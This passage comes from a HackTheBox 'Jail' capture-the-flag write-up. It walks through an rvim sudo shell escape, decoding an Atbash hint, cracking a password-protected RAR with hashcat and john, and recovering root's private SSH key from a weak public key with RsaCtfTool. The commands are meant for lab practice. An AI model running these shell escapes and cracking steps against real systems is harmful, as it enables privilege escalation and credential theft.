sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Which gets me into a very clunky and annoying VIM interface. From which I type the following:

```bash
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

I hit Enter and it then asks me for a terminal type, I enter `screen` and I get a shell:

![adm-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/adm-49.png)


### Adm

Now as the `adm` user, I immediately go to `/var/adm`, and I find the following:

![keys-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/keys-50.png)


This is an extremely unusual directory to be placed in `/var/adm`, which reads as such:

![keys-dir-51](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/keys-dir-51.png)


The `note.txt` file says the following:

![note-52](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/note-52.png)


This doens't tell us much at the moment, but it might be useful if we need to guess a password. 


The `key.rar` archive has root's public ssh key:

![archive-53](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/archive-53.png)


But it's password protected. 


There was also another cipher file from frank:

![enc-file-54](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/enc-file-54.png)


I use [this](https://www.quipqiup.com/) site to get the clear text of the cipher:

![clear-55](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/clear-55.png)


Which translates the file into:

```bash
Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!
```

If we try to [identify the cipher](https://www.dcode.fr/cipher-identifier) we will find that it's a [Atbash Cipher](https://en.wikipedia.org/wiki/Atbash#:~:text=The%20Atbash%20cipher%20is%20a,last%20letter%2C%20and%20so%20on.) Where `A` -> `Z`, `B` -> `Y`, etc. 


If we search for [people who have escaped from Alcatraz](https://en.wikipedia.org/wiki/List_of_Alcatraz_escape_attempts#:~:text=Frank%20Morris%2C%20John%20Anglin%20and,0.91%20m)%20wide%20utility%20corridor.) we will find three people:

1) Frank Morris
2) John Anglin
3) Clarence Anglin


Our user is probably `Frank Morris`. 


So the password should start with the string `Morris` followed by 4 digits and a symbol. To generate a wordlist for this specific structure we can use `hashcat` as such:

```bash
hashcat --stdout -a 3 Morris?d?d?d?d?s > frank-passwords
```

Which resutls in about 330K combinations. Now we just need to find a way to copy the `keys.rar` archvie to our attack machine. Because we are in a restricted environment, most of the common file transfer methods don't work. 


Therefore, our only option is to copy the `keys.rar` archvie to a location `frank` can access, like `/tmp` and make it world-readable:

```bash
cp keys.rar /tmp/keys.rar
chmod 666 /tmp/keys.rar
```

Then, we can use `scp` from our attack machine as such:

```bash
scp -i /home/ice/.ssh/id_ed25519 frank@jail.htb:/tmp/keys.rar .
```

Now we can crack it with `john` pn our attack machine with:

```bash
rar2john keys.rar > keys.hash
john keys.hash --wordlist=frank-passwords
```

![crack-56](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/crack-56.png)


I extract the archive:

![extract-57](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/extract-57.png)


The issue is that it's a public SSH key, we want the private key so we can login via SSH. There is actually a tool called [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) that will try to brute force the public key in order to try and derive the private key from it. 


I follow the installation instructions from the Github page, and after the tools is successfully installed, I run it as such:

```bash
./RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
```

Which manages to crack the private key:

![private-key-58](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/private-key-58.png)


I save the key to a file, give it proper permissions with `chmod 400 <key>`, and connect as root:

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i root_key root@jail.htb
```

![root-59](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/root-59.png)
